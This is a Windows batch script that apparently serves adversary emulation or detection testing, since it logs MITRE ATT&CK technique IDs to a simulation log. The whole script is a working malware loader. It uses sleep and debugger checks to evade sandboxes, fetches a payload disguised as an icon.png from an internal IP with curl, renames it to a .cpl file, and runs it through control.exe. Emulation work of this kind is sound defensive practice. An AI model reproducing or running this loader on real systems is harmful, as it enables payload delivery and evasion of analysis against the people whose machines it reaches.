@echo off
setlocal enabledelayedexpansion

REM Random-named SET variable declarations for all PHR_* placeholders
SET rhyzxt=%APPDATA%\10847\e1b16d00
SET mkjwrf=04821b46.txt
SET nqpbwx=https://10.0.0.49/stage/2/icon.png?10847-7
SET fgtsac=BALAM-S2BO
SET hlkyvd=10847
SET qplmno=7
SET vczcdr=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Initial delay (10-20s) to evade sandbox
timeout /t 15 /nobreak >nul
echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: initial_delay=15>> "!vczcdr!" 2>nul

REM Heartbeat fetch
echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: heartbeat_start>> "!vczcdr!" 2>nul
curl -k -s -o "!rhyzxt!\!mkjwrf!" "!nqpbwx!"
echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: heartbeat_complete>> "!vczcdr!" 2>nul

REM Delay between operations (ping method)
ping -n 4 127.0.0.1 >nul
echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: delay_ping=4>> "!vczcdr!" 2>nul

REM Anti-analysis: debugger detection via tasklist (approximation)
echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: debugger_check_start>> "!vczcdr!" 2>nul
tasklist /FI "IMAGENAME eq windbg.exe" 2>nul | find /I "windbg.exe" >nul
if not errorlevel 1 (
    SET /A dbg_sleep=%RANDOM% %% 3 + 2
    timeout /t !dbg_sleep! /nobreak >nul
    echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: debugger_detected_sleep=!dbg_sleep!>> "!vczcdr!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: debugger_not_detected>> "!vczcdr!" 2>nul
)
tasklist /FI "IMAGENAME eq x64dbg.exe" 2>nul | find /I "x64dbg.exe" >nul
if not errorlevel 1 (
    SET /A dbg_sleep=%RANDOM% %% 3 + 2
    timeout /t !dbg_sleep! /nobreak >nul
    echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: debugger_detected_sleep=!dbg_sleep!>> "!vczcdr!" 2>nul
)
REM Log T1497 after all evasion checks
echo [!tsvar!][TTP][!fgtsac!][!hlkyvd!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!vczcdr!" 2>nul

REM Change directory to output directory
echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: chdir_start>> "!vczcdr!" 2>nul
cd /d "!rhyzxt!" >nul 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: chdir_result=1>> "!vczcdr!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: chdir_result=0>> "!vczcdr!" 2>nul
)

REM Rename DLL to .cpl
echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: rename_start>> "!vczcdr!" 2>nul
ren "!rhyzxt!\!mkjwrf!" "!mkjwrf!.cpl" >nul 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: rename_result=1>> "!vczcdr!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: rename_result=0>> "!vczcdr!" 2>nul
)

REM Random delay before execution
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul
echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: random_delay=!delay!>> "!vczcdr!" 2>nul

REM Execute .cpl via control.exe (LOLBIN)
echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: control_start>> "!vczcdr!" 2>nul
control.exe "!mkjwrf!.cpl"
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: control_result=1>> "!vczcdr!" 2>nul
    echo [!tsvar!][TTP][!fgtsac!][!hlkyvd!]: T1218|System Binary Proxy Execution=FAIL:control_exitcode_!errorlevel!>> "!vczcdr!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!fgtsac!][!hlkyvd!]: control_result=0>> "!vczcdr!" 2>nul
    echo [!tsvar!][TTP][!fgtsac!][!hlkyvd!]: T1218|System Binary Proxy Execution=OK:>> "!vczcdr!" 2>nul
)

REM Final delay before exit
timeout /t 5 /nobreak >nul

endlocal